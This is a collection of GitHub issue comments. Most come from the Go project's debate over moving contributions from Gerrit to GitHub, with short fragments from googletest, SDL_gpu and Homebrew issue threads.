I'd further break down your insulting comment and prove how misguided and misinformed you are but there's no point in that.

Here's a proposition instead. If you, and anyone else, think you can do better than the Go Team and their contributors, fork the project and put it on Github. Oh and then try not to leech anything from the Go project anymore. See how that goes for you and let us know.

Now, to the rest of people reading.

I have a distinct feeling that because a very few overly vocal people don't like changing their habits and the herd mentality that plagues the Go community when it comes to anything that's even mildly important, this has been falsely labeled as Gerrit is HARD I'M NOT GOING TO TOUCH IT. Which in turn, of course, caused waves of people to say: noup, I'm not going to touch it, even without trying to do so.

And you can see it here, in this very issue as well: some other companies are on Github, so Go _must_ be on Github as well. Why? Because programmers that want to do drive-by PRs can't be bothered to read some documentation if they want to do so?

PolyGerrit, the ""new"" UI on top of Gerrit has made things a lot easier to use that they were in the past. Has anyone of the crowd actually tried to use it to leave a comment on a CL before? 

Everyone I've heard in the Contributors Workshop were all: Oh, but this is so easy to use. So where is this disconnect coming from?

The Go Team has established rules and ways to do things, for their project, which they've worked on, and open-sourced. There's nothing forcing anyone to use Go yet everyone seems to have an opinion on how the Go Team should lead the project. 

It's rather funny (and sad at the same time) that the same people commenting now how Go creates these ""barriers"" demand things to be changed at the expense of the whole ecosystem, when just last week they were behind another popular open-source project maintainer which blogged about how hard can it be to be a maintainer when everyone feels entitled to impose their views on projects and have demands for authors of those projects.

And here's another thing. If someone has to learn something new, it's not a bad thing, ok? It's a GOOD thing. Repeat after me: learning new things is GOOD.

The Go Team was discussing about having PRs automatically ported to Gerrit CLs, would that not be a good first step into educating people how to use it?

Or do we just want to peer pressure them into changing the tools they use before we try and help them by creating better documentation for the process or better tooling?"
3157	"@dlsniper #18517 sounds like a good start to a solution for me. I can understand that it must be frustrating to have everyone tell you to change how you do everything, but one way to interpret this issue is as ""a lot of people think this is hard but I know that it is not so what can I do to demonstrate that it is easy or to make it even easier?""

> Has anyone of the crowd actually tried to use it to leave a comment on a CL before?

Yeah and I gave up since I couldn't figure out how to actually submit the comment and all the docs were for the old UI. Maybe that has since improved. The new UI is prettier but it still fairly opaque. I felt like I hadn't been given the secret cheat sheet passed around the office with all the key combos to press to make it work. I'm sure it's very easy if you have someone who knows what to do stand behind your chair and show you how to do everything. Not all of us can make it to a contributor workshop.

Github's review system isn't great but at least I'm used to it and I can find docs about how to make it do the stuff I need it to do. I would be 100% fine if there were just sufficient docs, honestly. I've submitted patches to projects with far more baroque processes: but they had better docs.

I don't mind learning new things when they're interesting things or useful things. But I'm not going to invest a bunch of time to learn how to fill out what is essentially a big form that no one bothered to put any labels on when I have the option to do literally anything else with my life.

> Or do we just want to peer pressure them into changing the tools they use before we try and help them by creating better documentation for the process or better tooling?

Asking the people who can't figure out the documentation to fix the documentation by using the documentation they can't figure out doesn't sound like an effective strategy. . . .

"
3158	"@jimmyfrasche Thank you for the reply.

> Github's review system isn't great but at least I'm used to it and I can find docs about how to make it do the stuff I need it to do. I would be 100% fine if there were just sufficient docs, honestly. I've submitted patches to projects with far more baroque processes: but they had better docs.

That's exactly the kind of discussion that I think it should happen before jumping to more drastic measures like the one currently suggested.

> Asking the people who can't figure out the documentation to fix the documentation by using the documentation they can't figure out doesn't sound like an effective strategy. . . .

Fully agree, but I haven't seen anywhere an issue raised that the Gerrit UI needs to do better to guide people that are just getting started either. That's what makes feedback like yours invaluable. This comment is a very good contribution to the Go project. Based on it action can be taken, things can be improved.

Thank you."
3159	"This conversation has devolved into talking past each other and ad hominem attacks without a concrete plan for moving forward.

Given that the perception is that moving to GitHub would regress the reviewer experience, here are my suggestions:

+ Draft a feature comparison between Gerrit and GitHub with input from golang-dev@ as to what features are keeping the project off of GitHub for Code Review.
+ Present a proposal that addresses the concerns raised by the members of the development team where you explain how these issues will be solved either by presenting a (very) convincing argument that they don’t really matter, or proposing changes to existing tooling. Concrete data also helps you in this case. Rallying for GitHub to implement features is also not out of the question.
+ Outline who will do the work and what the timeline is. If it’s the Go team at Google, explaining why it’s more important than the many other things on our plate is part of the process.

Other actions not related to moving to GitHub:

+ File bugs to improve documentation in cases where you feel it’s confusing or lacking.
+ If you can, submit patches to make the documentation or tooling better.

Calling into question whether the project is “true” open-source as a result of the Go team’s software choices, trivializing the work needed to make the change, and presenting opinions as facts will likely harm the proposal’s chances of being accepted.
"
3160	Some of the comments on this issue are getting rather heated.  I would like to remind everyone that we are all on the same side.  Please bear in mind the [Go community code of conduct](https://golang.org/conduct) and be repectful and be charitable.  Thanks.
3161	"IMO, the barriers to entry mostly are going to filter out less frequent contributors who wouldn't bother learning how to contribute for a couple bugfixes here and there. Of course, those contributors could become common contributors if their experience is positive.

It seems to be implied that these potential contributors would not have any chance of bringing enough value to be worth the trouble. That seems silly to me and if it were true it absolutely calls into question why larger projects are choosing GitHub. After all, I definitely don't feel as though GitHub is a superior tool to it's alternatives. Practically, I'm a bigger fan of Gitlab. But GitHub.com is, right now, definitely the primary hub for open source, and it's reasonably stable (unfortunately, Gitlab.com is still having trouble with stability.)

Reality is I think the Go project will be fine no matter what happens, but I do think moving to GitHub would bring in more contributors. If the quality of the contributions are low enough to not be justified, I'd be kind of shocked."
3162	"@andybons that sound a very good and constructive plan to me. Looking at other large-scale projects that have the GitHub / Gerrit duality such as OpenStack would help to get a different perspective of the same problem approached by an equally large community of developers.

We have a similar issue on Gerrit itself where, strange but true, some of the fixes are coming from GitHub and then are so difficult to manage there.

The shortcut of saying ""everybody knows GitHub"" isn't just enough to justify a shift from an OpenSource tool to a proprietary platform."
3163	"> We have a similar issue on Gerrit itself where, strange but true, some of the fixes are coming from GitHub and then are so difficult to manage there.

@lucamilanesio can you comment on #18517 with the issues you encountered to provide more context? Thanks :)"
3164	@andybons sure, let me do it now on #18517 and give some other examples of OpenSource projects using GitHub and Gerrit together on GerritHub.io.
3165	"> IMO, the barriers to entry mostly are going to filter out less frequent contributors who wouldn't bother learning how to contribute for a couple bugfixes here and there.

The entry barrier to use a car on a public road is to get the driver license first which means some learning. Some things initally require that, but that says nothing bad.

One can figure out the contribution process in half an hour or so. Most of us spent much more to get the DL."
3166	"@ianlancetaylor I do apologize to you and everyone else as I realize that my comments may be read in both hostile and non-hostile ways. I certainly do not wish the first, and certainly I don't want to dismiss one-time or low frequency contributors. All I want to do is to help offer a different way of seeing this problem.

@cznic 
> One can figure out the contribution process in half an hour or so. Most of us spent much more to get the DL.

I think that's the problem. The current documentation, https://golang.org/doc/contribute.html specifically, needs a bit of a refactoring in order to help making that ""figure out"" part trivial and instead of being a half an hour endeavour, be rather a 5 minutes read thru with copy-paste and images.

It definitely took me more than 1/2 hour to do my only bug fix to the project, a typo. And I was feeling super happy when Brad reviewed it and merged it. What I've failed badly since then was identifying in which areas I could make contributions, which problems I could help solving, and how to get past the: I'm going to submit this PR and everyone will laugh at me and I'll just waste the reviewers time, which is very limited as it is. I don't feel particularly worthy wearing the same ` Contributor ` label that Github so quickly applies to everyone.

Personally, I've tried to do what I thought it's the next best thing, be as helpful as I can to anyone asking questions in Gophers Slack (and other environments) and talk at conferences about learning Go and its strengths or teach Go to those that want to learn it.

I hope this helps you see another side of the story."
3167	"@cznic 

>The entry barrier to use a car on a public road is to get the driver license first which means some learning. Some things initally require that, but that says nothing bad.

No offense, but I don't feel like that is an apt or related comparison at all. Driver's licenses are intentional barriers that are supposed to help ensure some level of proficiency for a task that is dangerous. Gerrit is not intentionally a barrier, and willingness to learn it doesn't ensure proficiency or value at all. The way I see it Gerrit is: 1) Not intentionally a barrier to entry, and 2) Not an effective _quality_ filter.

Whether that largely impacts things is yet to be seen. Personally, I don't have a horse in this race, but I think it's unfair to paint Gerrit's barrier to entry as a lowpass filter.

The barrier doesn't have to be huge to be worth considering, either; I don't think it's an enormous barrier. But certainly, projects that moved from private SVN servers or a similar setup to GitHub can attest to what lowering the friction does."
3168	"@jchv @cznic I believe the point is not defining a ""barrier"" to filter contributors but rather use the best tool for managing contributions.

If the *best* tool requires a bit of training, fair enough. At the end of the day, a contribution is not *pushing code over the fence* but cooperating and discussing around a solution. GitHub *is getting better* in doing so, but is still at least 2 years behind what it should be.

What is more worrying from my point of view is the lack of control and direction from its users: lots and lots of features requests were ignored for years. With Gerrit Code Review if you want to propose a feature, you just submit your code and there you go.

This is the reason why Gerrit is *way better* in managing reviews: it is built by the people that need to do reviews every day on large projects with hundreds of contributors and repositories."
3169	I agree on some aspects. GitHub is far from perfect, after all. I'm just asking for the powers that be to weigh it against the advantages too. Unfortunately, since its hard to definitively predict the potential gain from such a migration, it's hard to compare it to the negative impact which is already apparent based on current reactions.
3170	Here's an explanation from an EclipseCon couple years ago that I recommend. https://youtu.be/Wxx8XndqZ7A
3171	"There are a lot of folks that seem to be of the opinion that having the contribution process be complicated / full of ""barriers"" is good because it filters out bad/low-effort contributors.

I don't think this is true at all, and I think that this attitude is dangerous in the long run since it can lead to stagnation.

Serious contributors don't always start out serious. They start out curious. Someone can be the best programmer in the whole world, but unless they have a very strong reason to work on your open source project (few do), on encountering barriers they may just decide to go elsewhere. I know plenty of amazing programmers who have complained about such barriers in the past and never gone back to a project they were initially interested in contributing to.

I think it's important for open source communities to care about this, because otherwise it's harder for them to grow.

Drive-by low-effort PRs are a problem, but ... just close those. Using general barriers to contributions to discourage drive by PRs is using a sledgehammer to crack a nut -- unnecessary and plenty of collateral damage will be caused.

------------------


I'm really partial to the solution from https://github.com/golang/go/issues/18517 . This tradeoff between ""complicated process, good for large contributions"" vs ""easy process, bad for large contribs"" is a common one when it comes to open source workflow. And almost always you can expand your workflow to allow for _both_. All the features that make Gerrit good? They're not exactly necessary for smaller changes; what GitHub has is _great_ for small/medium changes that span a few commits. If a PR comes in that reviewers don't think is easy to deal with on github I'm sure the author (someone who has put in the effort for such a large PR) will not mind putting a relatively small amount of additional effort to use gerrit.


----------

@FiloSottile mentioned patch review history being very fragile in GitHub -- I agree, and this is why in Servo we use http://reviewable.io/ . It's a bit hard to get used to (and, in the spirit of what I was just talking about, we only use it for complex pull requests) but it's pretty nice and has decent github integration. If you plan on accepting patches on github and using gerrit for complex stuff this probably won't be necessary, but in case y'all decide to move over to github entirely this tool might be useful."
3172	"Noone really thinks we should disregard the reviewers thats at least not what I do and generally I feel tht the most active participants of any project has more say.

I also do think that more contributions would take place if if it was simpler. Some examples have come up where this is the case but perhaps the most relevant is Rust where it seems to be all about Github PRs.
This would undoubtedly in the long run also lead to more reviewers which seems to be one of the most important aspect, reviewers time is limited. Increasing the number of reviewers is probably the best way to do this since it would not just increase the flow but also free up the existing reviewers to do other things. Sure migrating would require changes and learning a new way for the current reviewers, we are all aware of that.

Fwiw I still cast my vote in favor since I value a larger community of truly engaged users than the alternative. (Yes I know, they are not mutually exclusive.)"
3173	"It seems that the longer this thread becomes, the longer the replies too :-)

I think that what made Go awesome was putting together the minds that built it, people like Ken, Rob Pike, Robert Griesmer, Russ Cox, Ian Lance Taylor etc. While I am very happy that Go is a community oriented project and that everybody is welcomed to contribute to it, I'd like to believe and hope that Go will continue to be equally awesome and well thought out in the future as well, including new major versions. For this to happen the critical part is the reviewers. I'm not dismissing contributions of course, because without them Go wouldn't be where it is today. But I think that the reviewers and core team members are of upmost importance and the tradeoff of using Gerrit for their comfort is not really a trade-off. Gerrit is a free open-source code review tool which has worked great so far and will continue too in the future, unlike GitHub which is corporate proprietary software. I like the GitHub experience but I don't mind the Gerrit one. I am actually glad Go uses it.

In my opinion the effort and heat put into this discussion far outweighs any potential benefits. Is it really that hard to contribute to Go? If I read the contribution guidelines and decide half way that I don't want to contribute - that doesn't mean it's hard, it just means I'm lazy, which probably means my contribution wasn't really something worthwhile in the first place."
3174	Even if it would not be GitHub, but a GitLab instance run by the Go project to be independent, it would be an improvement. This is what tens of thousands of developers are uses to and it significantly lowers the contribution bar. However, it sometimes feels like this is not really what everyone wants. Reasons unclear to me.
3175	"I think you should go with the method that gives the best quality in the end result (i.e. fast and more or less bug-free code). Gerrit has proven its value for many releases and moving away from that requires some very solid arguments. 

I have contributed to the Go project in the form of many bug reports, and I try to do a good job of creating a main func that demonstrates the problem; but I then hand it to someone who, hopefully, have studied the code enough to understand what and where the problem is. So testing and bug reporting are valuables contributions that I don't need Gerrit to do.

Would I have created GitHub PRs with code changes if that was an option? Maybe some cosmetic polishing, but for me to really contribute something, I would have to spend so much time getting familiar with the existing code and the problem at hand that I might as well add Gerrit to the mix.

You could, however, consider making contributions in the non-code department easier (documentation ...).
"
3176	"I haven't had a chance to read the whole discussion yet, and I probably won't until next week, but I wanted to respond briefly to what seems like a wrong turn that happened in the initial report.

> #18517 talks about accepting PRs... .except that it's not really accepting PRs. It's using PRs as a way to feed code into gerrit. This is going to be a terrible user experience, because it will be disconnected from the normal github workflow.

If I could respectfully disagree, #18517 _is exactly about really accepting PRs_. As we envision that work, someone new sending us a PR on GitHub should get through the entire process, from the initial pull request to the final submit, including code review discussions and the like, without even realizing that the reviewers are not typing into boxes on github.com. We have limited resources, and we haven't put time yet into making that a reality, but I see no reason to believe it's not possible.

It is true that “just using GitHub” would improve the experience for a large number of new contributors, and that using Gerrit instead optimizes for the experience of the comparatively smaller number of code reviewers, but in fact code reviewers are our limiting factor. Making sure they have the best tools helps land more, higher-quality commits into Go in less time. Gerrit is simply a far better tool than GitHub for the people who spend all their time (and then some!) working on Go on a daily basis, and we have optimized for them. If the Go project has a secret sauce at all, it is the sustained focus on the quality of the code base, primarily through careful code review.

Getting back to #18517, although we have optimized for code reviewers, I don't believe we have to stop there. We recognize that on the code contribution side, many people are already familiar with the GitHub PR workflow and that it's not worth their time to learn a new workflow to send a small change. That's why #18517 is so important - it would let us dramatically improve the process for new contributors without hobbling our experienced reviewers. And that's why I object so strongly to saying it's going to be terrible. If it's terrible, then it doesn't help. It needs to be amazing, and I'm confident that it can be.

As I mentioned above, we have limited resources and haven't been able to put time into making #18517 a reality yet. If anyone in the community wants to work on building out the design and then an implementation, please let us know by commenting on that issue.

Thanks very much."
3177	"@dlsniper Thank you for your reaction. I did take a brief look at Gerrit and from what I could there are more options and possibilities than Github has. It just looks/feels different and that may be a barrier for people, while it would be nice if there where no barriers at all. If the instructions are clear, and I must admit I didn't fully read them, it would depend how much effort I'm willing to put in it at that time. I will have to learn a bit about Gerrit, read the instructions etc.. And I probably won't use Gerrit a lot. I can imagine someone wouldn't contribute because of that.

@as Thank you for your answer as well. I agree with you that good contributors contribute to software to fix problems they have found. I also agree with the last part of your comment - that the people who are actually building the software - should decide (as I say later in this comment, sorry if that wasn't clear enough in my original comment).

While reading the replies I also see that a lot of current contributors see migrating to Github as a big barrier. Because they are the ones that keep the project alive in the end I believe it's important that they have a voice in it. If I were a frequent contributor myself at a Github project I would see it as a barrier if that project migrated to another system (like Gerrit) as well and might stop contributing because of that. Maybe other solutions that are posted here will work, like integrating Github with Gerrit or using an own instance of Gitlab.

I think this will be my last post in the discussion here because I actually don't know everything about Github yet and am not actually a part of the Go community yet. I don't really feel I should be talking about this, but just wanted to make clear in my initial post that migrating to Github (again, only if it does not damage the community in any way) is a good step to take so people who just started coding can also start contributing easily within an environment they (probably) already know. I am not trying to 'vote' against migrating - just giving the people who should be deciding in the end my opinion so they can take that into account as well (I could have made that more clear in my first comment - sorry for that)."
3178	"One other thing to consider when taking the decision:
- in a Google controlled infrastructure (I suspect) it's Google people that have to provide support for any potential issues
- in a Github controlled infrastructure, we all depend on Github 

It's a fact, I'm not stating that either companies has better engineers than the other.

However, it seems that at least at the time of writing this, Github status does not display the uptime metrics anymore, having them replaced with a rather uninformative page about their current status, not the overall performance, see 
![screencapture-status-github-messages-1506097005331](https://user-images.githubusercontent.com/607868/30754245-f1a3751c-9fb9-11e7-962c-f236c078715b.png)
"
3179	I've filed #21983 for a possible way to improve the contribution guidelines in the meantime based on issues I've had with my aborted attempts at the process
3180	"FWIW, @dlsniper, yes, that has come up in the past: https://twitter.com/bradfitz/status/692510984339111936. :-)

"
3181	"I wanted to chime in here, not because I necessarily have something to add, but to add an interesting perspective and experience from two contributors. 

I used to frequent the Gophers Slack channel, so I could help people ad hoc. I met @zmb3 because he had asked for help with the “git-code-review” tool after it put him in a weird state. After working with @zmb3 for awhile to get him unstuck, he got me an interview with his company and ultimately I got a job. 

My point is the process is so poor/complicated/convoluted/<synonym>, less so now, for contributors, being able to help someone get unstuck got me a job because it’s a black magic process. I have made a couple small contributions in my several years of professional Go experience, and I decided I didn’t want to keep contributing because the process was complicated. 

I get that cherry-picking is super helpful, but as half the Golang build infrastructure does various git operations anyways, a merge workflow with cherry-picking would be easy to add. "
3182	"https://gerrit.googlesource.com/summit/2017/+/master/index.md

Gerrit User Summit 2017
30 Sept. through 3 Oct.

CodeNode, 10 South Place,
London, EC2M 7EB, GB"
3183	"http://www.varastokirjasto.fi/digiphpt/dump_fnatur.txt
""28 Skogen och vår identitet Erkki Lähde"";;""1984""

'The Forest and our Identity'

Prof. Lähde recounts when as a young graduate out of forestry studies, he had the occasion to visit a village in the Finnish countryside. He noticed in the area a group of trees which to his view was overdue to be cut. But enquiring upon the local villagers of that stand of trees, the reply was that there was an old woman from the village who had liked to walk among that grove. Thus the trees were saved out of piety.

Erik Erikson, a Norwegian pædagog had introduced me to his writings, wrote once of how moralistic man and rationalizing man, as an emotional and political being undoes with ""compulsions and impulses what his thought has invented and what his hands have built"".

There's also a Viennese saying:

""Es pressiert nicht. Wir haben Zeit.""

So, a valid question for me:

Is there an æsthetic in the workflow of those using Gerrit?"
3184	"It is important to understand the level of effort it takes for maintainers to review so many changes. Github does not make that easy for projects with a high volume of ""pull requests"". Gerrit helps maintainers tune in and accept changes. Github is just a UI!"
3185	Each commit should be laser-focused on a particular issue and include Release Notes suitable for user consumption. There is no excuse for sloppy, mangled pushes.
3186	"I read through this thread, and I find it interesting that the other of the two complaints brought up in the OP is the one I feel is the legitimate issue, yet it got practically no attention:

> Go feels like it's a Google-owned-and-controlled project that is not truly ""open source""

But before I get to that, I will briefly comment with regard to GitHub vs Gerrit and ""ease of contributing"". If Gerrit is complicated or unfamiliar, then it seems the most productive plan of action is to report issues to [the Gerrit project](https://www.gerritcodereview.com/) or even contribute improvements directly. You're much more likely to effect change in Gerrit (or a similar open source tool) than others will have in convincing GitHub to add the various features it lacks for reviews, among other things.

Additionally, if the Go team _were_ up for changing the system, I would personally push for using `git format-patch/send-email`, which is used by the Linux kernel as well as countless other long-running open source projects (or if they don't use Git, they still use a mailing list system). I'd propose it mainly because, aside from those commands being included in Git and the workflow arguably being even easier than Gerrit (it's just email!), it would still offer some semblance of the functionality Gerrit offers, but it would also create a little mayhem, too--and who doesn't enjoy that every now and then? :)

Now, back to that second point. **Go _is_ a ""Google-owned-and-controlled project""**. That CLA you sign? It ~~assigns the copyright~~ grants a license for your contributions to Google. I'm not about to claim that the CLA is much of an issue, though. Go can be Google-owned and still be an open source project. There are other symptoms that could be looked at instead, in my opinion.

Quite a few times I've either read or taken part in discussions that included one of the Go team members mentioning a topic as having been discussed by the Go team in one of their internal meetings, sometimes not expanding beyond that. Similarly, I feel like the team's resistance to shortening the 6-month release cycles to approach a more continuous-delivery-style pipeline might be evidence that the team is sort of siloed by Google's internal mechanisms and culture. If you're going to make the argument that Go doesn't feel like a true ""open-source"" project, _these_ would be some of the things I would want to discuss."
3187	"I do not like where this thread is going.

An increasing number of comments are stating or implying that contributors not willing to put in the effort to overcome the inertia are somehow worth less. @Manishearth articulated well why it's wrong in https://github.com/golang/go/issues/21956#issuecomment-331353818, but I want to go a step further and say that [it's unacceptable](https://golang.org/conduct).

While I fall on the side of optimizing for review myself, that's about process and resources, not people, and any lost contributor is an unfortunate trade-off which we should try to compensate for (which as @rsc reiterated is the point of #18517). Can't believe this had to be said.

(In case this sounded official, this is a personal opinion and I have no affiliations.)"
3188	"> (it's just email!)

It's not. Lots of folks don't realize this, but git-send-email is a really _hard_ workflow.

It works great if you already use a local mail client. Many don't. Many _can't_, because of port blocking and firewalls (a large fraction of universities do this for example). Port blocking SMTP in particular is annoyingly common because of the way spam detection works. If you are behind a large NAT (like a university, or a workplace), and you use the connection to send out lots of spam directly via SMTP, it's very easy for that IP address to get banned. The administrators may not want to deal with this, so they'll just block the port.

The traditional patch mailing list approach also has terrible UX even with `git-send-email`. Replying to a mail requires copying the message id and a bunch of nontrivial steps which are definitely not built in. It's possible to set up local mail clients to work well with this, but this is not the default behavior.

The obvious way out here is for folks to ""just"" use web based clients with `git format-patch`, but that doesn't work well either. For example, GMail converts tabs to spaces (or was it the reverse?) in plaintext emails, so you can't just paste `git format-patch` output there.

It's possible to build tooling that makes all this pleasant (I'd love for this to exist!), but it doesn't exist right now as far as I know. I would be wary of moving to a patch mailing list approach for reasons that it is simpler (it has its merits! this isn't one of them)"
3189	"> That CLA you sign? It assigns the copyright for your contributions to Google.

No, it's a copyright *license*, not a copyright *assignment* ([read the full text](https://cla.developers.google.com/about/google-individual)).  All contributors still retain full ownership of everything they contribute to this or any other Google open source project.  This is orthogonal to the topics actually discussed in this issue, but I wanted to correct any misunderstanding on this point."
3190	@willnorris - You're correct! Sorry, I got the terminology mixed up. It's late here. :)
3191	OK, biased comment stricken. You've all got a good point. Maintainers also have to deal with all of this daily and some may be unpaid volunteers. In a perfect world Gerrit would have a GitHub integration plugin, IMO.
3192	"A few months ago I was invited to join a panel on contributing to Go organised by Ashely McNamara.

During that panel I asked the audience, via a show of hands, _""who felt that contributing to Go implies landing a commit on github.com/golang/go?""_. 

Nobody raised their hands.

I mention this to suggest that contributing to Go is not limited to landing code in one specific repository. Aside from non code contributions like running workshops, meetups, user groups, conferences, and release parties, the majority of code written in Go (which is what _I_ see as contributing to Go) will be in repositories outside github.com/golang/go (or its sister sub repositories), and this is how it should be. 

Do people feel that they cannot contribute to Java because it is hard to submit a contribution to OpenJDK (which as I understand it has a highly cumbersome governance model)? Of course not; they contribute to products built on top of the JDK. 

The notion that you are not a real or valued Go developer until you have contributed to the stdlib is toxic. This is the real problem."
3193	self-hosted GitLab or gitlab.com is a better open choice IMO
3194	I love GitLab, but GitLab.com is very unstable. Hosted GitLab CE would be cool, but I fail to see how that's not a lateral move. In my PoV, there's nothing wrong with Gerrit, there's just some potential gain for GitHub due to the sheer size of the open source community on GitHub.
3195	"For a project such as Go, the key issue barely discussed here is the sheer amount of infrastructure built on it. Docker, which is Go based, now runs infrastructure for major corporations and even countries. Much of Bitcoin, Kubernetes, CloudFlare, etc. heavily use Go. When a project serves as the base for that much, the process for making changes needs to be very nitpicky so as not to break major systems.

Linux is another open source project. It uses GitHub as a mirror, has a more complex contribution process, and is even more strict. It runs the majority of servers, so they need a very fine control over it.

Gerrit gives the reviewers more control and increases the efficiency. Yes, it may require more hoops than you may be used to. Yet Go is now mission critical to many just as Linux, Apache HTTPd, nginx, Docker, Python, MySQL are. At this point bugs and idiosyncrasies in the language are now features in active daily use. Making a small change could have an effect similar to pulling the left-pad package off of npm. Thus the process of contributing needs to be thorough, even if the extra testing and hoops seem redundant or unneeded."
3196	"https://talks.godoc.org/github.com/go-hep/talks/2017/2017-08-24-go-hep-acat/talk.slide#1

A circa 2017 printing on Go and HEP.
"
3197	"@Manishearth 

>> (it's just email!)
>> 
> [git-send-email] works great if you already use a local mail client.
> Many don't.  Many can't, because of port blocking and firewalls (a
> large fraction of universities do this for example). Port blocking
> SMTP in particular is annoyingly common because of the way spam
> detection works. If you are behind a large NAT (like a university,
> or a workplace), and you use the connection to send out lots of
> spam directly via SMTP, it's very easy for that IP address to get
> banned. The administrators may not want to deal with this, so they'll
> just block the port.

This **is not** how git-send-email works. People **DO NOT** send
SMTP from their own machines. People using git-send-email **USE**
*other* SMTP servers just like people using any other mail client,
including Outlook or even Gmail on their phones. In fact, the
git-send-email literaly lists using Gmail for SMTP as an example.
"
3198	"Github us not git, anymore that Sourcefirge was CVS or SVN.  The idea that GitHub is the one true place to put code is ridiculous and short sighted. 
  The Gerrit flow is quite pleasant. I don't think there's any harm in exposing people to something a bit different. 
  "
3199	"I think everyone has made their positions clear on this issue.

I think we have two plans: one is to tackle issue #18517 to add a flow between Github pull requests and Gerrit, and the other is to clearly document what seems to be lacking in the Github review flow as suggested in https://github.com/golang/go/issues/21956#issuecomment-331288287 .  I have created a new issue for the latter at #22002.

This issue is too large and diverse to usefully tackle either of those proposals, so I am going to close this issue.  Thanks for everyone's input."
3200	">  People using git-send-email USE other SMTP servers just like people using any other mail client

@4ad which also goes through various ports (including 25) which are often blocked."
3201	Because port 25 isn't meant for client to MTA communication, port 587 is. And no respectable ISP blocks port 587.
3202	"Many universities follow a whitelist, not a blacklist approach.

I've dealt with this problem with students I've mentored in open source more times than I can count.

(anyway, this is getting off topic)"
3203	"> Many universities follow a whitelist, not a blacklist approach.

Literally every university in the world sends e-mail. Except perhaps universities from North Korea. If you can send e-mail, you can use git-send-email.

As this is both offtopic for this discussion, and also as this issue has been closed, I ask you to stop.
"
3204	"> Both of these are **exasperated** by the fact that...

@natefinch  exacerbated"
3205	"Have you tried `git clone`-ing from this GitHub repo? The distro repo may have problems of its own.

I haven't had any problems building `googletest` (using the makefile in `googletest/make/Makefile`) with:

 - GCC (under MinGW-w64 on Windows 7, WSL on Windows 10, and Ubuntu 16.04 and above)
 - Clang (running as `g++` inside macOS 10.2 and 10.3)

I had slight problems building on the following platforms, but eventually overcame them. You can see how in [the Wiki pages of my project](https://github.com/tanzislam/cryptopals/wiki):

 - Visual Studio Community 2015 and 2017
 - Embarcadero C++Builder Starter 10.1 (Berlin) and 10.2 (Tokyo)"
3206	Note to self: don't invite Mark to the next party.
3207	There appears to be no actionable information.
3208	Their software that you're getting for [absolute free](https://www.reddit.com/r/ChoosingBeggars/)?  Stop complaining, take a break from your whiny entitlement, and contribute some code and/or documentation! 
3209	There appears to be no actionable information.
3210	"> Their software that you're getting for absolute free? Stop complaining, take a break from your whiny entitlement, and contribute some code and/or documentation!

Absolutely free?  Get a clue! 

First, there’s no such thing as free. Google isn’t running a charity here.  Their making money indirectly from open source. It saves them millions in licensing fees and plays into their fake “do no evil” propaganda. It also makes them a darling among  the gullible technorati. Of course, Google isn’t stupid enough to open source their search engine.

Second, I am entitled and have a right to complain. I am forced to use this crappy unit testing software for work because the boss wants to save money. Open source has decimated an entire industry of small software companies and solo developers who created quality software because they can’t compete with free. Ironically, big business, who are not threatened by open source, are the real winners. Unlike yourself, I will speak up when faced with no alternatives to dog food.

Finally, I respect the hearts and minds of software developers who care about quality. Ironically, most open source advocates have no issue paying for $2500 MacBook Pros, but throw a hissy fit at paying less than a cup of coffee for software. Under their logic, since software is ethereal, it has no percieved value, despite the enormous human effort involved in writing it. Open source advocates, such as yourself, are painfully unaware of how anti-intellectual, anti-competitive and destructive open source is. 
"
3211	"Absence of actionable information, cont.:

You downloaded it, did you pay for it?  Did you accept a contract to pay for it?  No?  'cause, that's what free means.  There's nothing about perfectly documented testing libraries in the UDHR, you weren't born with rights to high quality documentation of free libraries you downloaded off the internet.

Ha, you want the government to enforce competitive rules that work in favor of your particular situation?  Good luck with that!  Open source has been around a lot longer than you have, it's a permanent and significant feature of the competitive landscape, learn how to deal with it, it is integral to huge segments of the economy.  Whining about other people cooperating without your consent is ridiculous.  Humans have been cooperating with each other long before money was invented.  Indeed, money was probably invented to get rid of leeches that want everyone else to do their work for them, ahem.

Want to have any standing to ask for good software for free?  Then contribute some good software for free.  Tell your boss that's how it works and to stop being such a cheap bastard.  Want to figure out how to use gtest?  There's a great tool you can use to find that out, you might have heard it it, it's called ""google"", just google that.

If you don't like the instructions your boss gives you, don't flame the googletest engineers, omg, just get a different job."
3212	">  There's a great tool you can use to find that out, you might have heard it it, it's called ""google"", just google that.

Don't do it! https://www.youtube.com/watch?v=OqxLmLUT-qc"
3213	"```
I would love to have a software renderer that doesn't depend on OpenGL/Mesa.  
It is certainly possible to do, but unfortunately this feature is a low 
priority until there are more developers working on SDL_gpu or the codebase has 
time to mature and stabilize further.
```

Original comment by `grimfang4@gmail.com` on 20 Aug 2014 at 10:45
- Changed state: **Accepted**
- Added labels: **Type-Enhancement**, **Priority-Low**
- Removed labels: **Type-Defect**, **Priority-Medium**
"
3214	"Original comment by `grimfang4@gmail.com` on 8 Jan 2015 at 2:35
- Changed title: **Request for fallback software renderer**
"
3215	"This may not be helpful at all but inspired by this discussion, I’ve hacked together a [really crude one-off prototype](https://github.com/claui/homebrew-services-bulk) for a lightweight implementation of presets.

It uses one custom formula per preset, runs with homebrew-services as-is, and requires nothing else. Because it’s just a formula, it also auto-detects the dependencies.

**Usage:**

    brew tap claui/services-bulk

    brew install myservers

    [sudo] brew services list

    [sudo] brew services [start | restart | stop] myservers

**To customize, just change this array:**

```ruby
  DEPENDENT_SERVICES = [
    ""mariadb"",
    ""nginx"",
    ""php"",
  ]
```

I’m surprised to see this actually works for me. Feel free to use it as a stop-gap until someone builds something more maintainable. (Or maybe in case the presets feature turns out too narrow to be added to homebrew-services proper.)
"
3216	Thank you @claui, I'll give it a shot soon. Looks promising!
3217	This is a good idea, thanks for the detailed write up @ihorvorotnov!
3218	@steinmb Your comment was completely unrelated to this repository. The other thread was locked for a reason. 
3219	@MikeMcQuaid Thank you for getting back to me, though deleting comments is to me a unusual way of treating other developers. Ended up there because other issues got closed and linked in here. Should I create a separate issue regarding the dependency issue?
3220	@steinmb No, we are not interested in more discussion of that issue or of Homebrew's moderation policy with non-maintainers or non-contributors (particularly when Homebrew's maintainers are currently being barraged with personal abuse).
3221	@MikeMcQuaid Sorry to hear that. Take care and thank you for all your hard work.
3222	`httpd` will not be installed any more if you use the bottle: https://github.com/Homebrew/homebrew-core/pull/24907
3223	"This legacy repository is the wrong place to raise such an issue. Nevertheless, Homebrew/homebrew-core#369 and the issues/PRs linked from it might help you understand the decision. It's not like we remove formulae to annoy people. We tend to have good reasons. That said, if all the existing issues can be resolved, we'll gladly accept a pull request that re-introduces this formula in Homebrew.

